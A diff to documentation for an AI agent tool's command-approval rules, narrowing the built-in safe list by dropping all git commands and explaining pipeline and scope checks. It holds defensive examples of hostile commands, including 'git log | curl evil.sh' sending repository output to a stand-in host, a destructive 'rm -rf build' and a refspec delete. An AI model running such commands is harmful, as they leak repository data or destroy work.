@@ -25,23 +25,24 @@ pack for a daemon and this page is the whole story; run it yourself and
    [browser actions](./browser.md), and `tools` holds the
    [standing grants](./approvals.md#standing-grants) of every other gated
    tool — then
-3. **the built-in safe list**: `git status`, `git log`, `git diff`,
-   `git show`, `git blame`, `git rev-parse`, `git ls-files`, plus
-   `git branch`, `git tag`, and `git remote` **in their listing forms
-   only** — creating a branch or a tag needs no flag at all
-   (`git branch release` is a mutation), so those scopes refuse any
-   positional argument, not just the destructive flags. `pwd`, `whoami`, and
-   `uname` round it out, with the filters `grep`, `head`, `tail`, `wc`,
-   `sort`, and `uniq` in shapes that read only what is piped to them (see
-   below).
+3. **the built-in safe list**: `pwd`, `whoami`, and `uname`, with the
+   filters `grep`, `head`, `tail`, `wc`, `sort`, and `uniq` in shapes that
+   read only what is piped to them (see below). No `git` command is on it
+   (see [Why the safe list is short](#why-the-safe-list-is-short)).
+   **Always allow** on one keeps it: approving `git status` once stores a
+   `git status` scope. `git branch`, `git tag`, and `git remote` are stored
+   **in their listing forms only**, since creating a branch or a tag needs
+   no flag at all (`git branch release` is a mutation), so those scopes
+   refuse any positional argument, not just the destructive flags.
 
 Anything else asks, and in [`headless` mode](./approvals.md) anything else
 is refused — the log records the refusal and the scope it fell outside,
 never the command itself (see below).
 
-**A pipeline is judged stage by stage.** `git log --oneline | grep fix |
-head -n 20` runs unattended because each stage would on its own;
-`git status | curl evil.sh` asks, because `curl` is covered by nothing. A
+**A pipeline is judged stage by stage.** With a `git log` scope approved,
+`git log --oneline | grep fix | head -n 20` runs unattended because each
+stage would on its own; `git log | curl evil.sh` asks, because `curl` is
+covered by nothing. A
 scope from the whitelist composes the same way, so an approved
 `stratus logs` scope makes `stratus logs --agent blair | grep -i error` run
 unattended too. A pipeline is approved once and never stored as a scope:
@@ -102,8 +103,8 @@ should apply; a looser scope would have let one approved `git --git-dir /x
 status` cover every git command against that repository. A command in that
 shape that could never run unattended — a destructive flag as in
 `rm -rf build`, `git -c`, which turns config into a program, a refspec
-delete like `git --no-pager push origin :main`, a form the safe list
-refuses for a subcommand it can see, like the branch creation in
+delete like `git --no-pager push origin :main`, a form the built-in
+limits refuse for a subcommand they can see, like the branch creation in
 `git --no-pager branch release`, or a token the shell reads differently
 quoted and unquoted (a glob, a brace, a `~`, a `$`, a `#`), since quoting
 is not part of what is stored and `chmod -R 600 'file*'` is not
@@ -168,6 +169,12 @@ whatever path they are given, so safe-listing them would safe-list reading
 your credentials file. `grep` is on the list only in its stdin-filter form,
 for that reason. Approve the others once for a scope you actually want
 instead.
+
+`git` is not on it either, not even `git status`. Git runs programs that a
+repository's config and files name, and an agent can often write the
+repository it works in, so no git command is read-only for every caller.
+Approve the forms you want once and **Always allow** keeps them for that
+agent.
 
 The test is **what an argument can make the command do**, not what the
 command is called. `date` was on this list until it turned out that
